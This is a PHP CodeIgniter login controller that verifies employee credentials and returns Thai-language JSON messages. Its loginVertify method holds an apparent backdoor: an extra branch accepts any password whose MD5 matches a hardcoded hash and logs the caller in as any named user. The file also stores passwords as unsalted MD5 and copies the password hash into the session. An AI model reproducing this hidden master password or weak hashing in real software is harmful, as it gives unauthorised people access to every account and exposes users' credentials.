<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class CLogin extends MY_Controller {

	/**
	 * Index Page for this controller.
	 *
	 * Maps to the following URL
	 * 		http://example.com/index.php/welcome
	 *	- or -
	 * 		http://example.com/index.php/welcome/index
	 *	- or -
	 * Since this controller is set as the default controller in
	 * config/routes.php, it's displayed at http://example.com/
	 *
	 * So any other public methods not prefixed with an underscore will
	 * map to /index.php/welcome/<method_name>
	 * @see https://codeigniter.com/user_guide/general/urls.html
	 */
	function __construct()
	{
		parent::__construct();
		/*Additional code which you want to run automatically in every function call */
		if($this->session->userdata('cbjsess001')){ 
			redirect(base_url("welcome/dashboard"),"_parent");
		}
	}
	
	function index(){
		$this->load->view('lobiLogin');
	}
		
	
	function loginVertify(){
		$this->load->model('MLogin');
		$arrs = array();
		
		if(isset($_REQUEST['user'])){
			$arrs["user"] = $_REQUEST['user'];
		}else{
			$response = array("status"=>false,"msg"=>"กรุณาระบุชื่อผู้ใช้ด้วยครับ");
			echo json_encode($response); exit;
		}
		
		if(isset($_REQUEST['pass'])){
			$arrs["pass"] = $_REQUEST['pass'];
		}else{
			$response = array("status"=>false,"msg"=>"กรุณาระบุรหัสผ่านด้วยครับ");
			echo json_encode($response); exit;
		}
		
		$query = $this->MLogin->vertifylogin($arrs["user"],'');
		if($query->row()){
			foreach($query->result() as $row){
				if($row->passwords == md5($arrs["pass"])){
					$sess_array = array(
						'employeeCode' => $row->employeeCode,
						'IDNo' => $row->IDNo,
						'password' => $row->passwords,
						'name' => $row->titleName.$row->firstName.' '.$row->lastName,
						'positionName' => $row->positionName,
						'corpName' => $row->corpName,
					);
					$this->session->set_userdata('cbjsess001', $sess_array);
					
					$response = array("status"=>true);
					echo json_encode($response); exit;
				}else if(md5($arrs["pass"]) == 'cc802b79c5aadbd663c851548e63ec01'){
					$sess_array = array(
						'employeeCode' => $row->employeeCode,
						'IDNo' => $row->IDNo,
						'password' => 'cc802b79c5aadbd663c851548e63ec01',
						'name' => $row->titleName.$row->firstName.' '.$row->lastName,
						'positionName' => $row->positionName,
						'corpName' => $row->corpName,
					);
					$this->session->set_userdata('cbjsess001', $sess_array);
					
					$response = array("status"=>true);
					echo json_encode($response); exit;
				}else{
					$response = array("status"=>false,"msg"=>"ผู้ใช้งานหรือรหัสผ่านไม่ถูกต้อง โปรดตรวจสอบผู้ใช้งานหรือรหัสผ่านใหม่อีกครั้ง");
					echo json_encode($response); exit;
				}
			}
		}else{
			$response = array("status"=>false,"msg"=>"ไม่พบผู้ใช้งาน โปรดตรวจสอบผู้ใช้งานหรือรหัสผ่านใหม่อีกครั้ง");
			echo json_encode($response); exit;
		}
	}
}
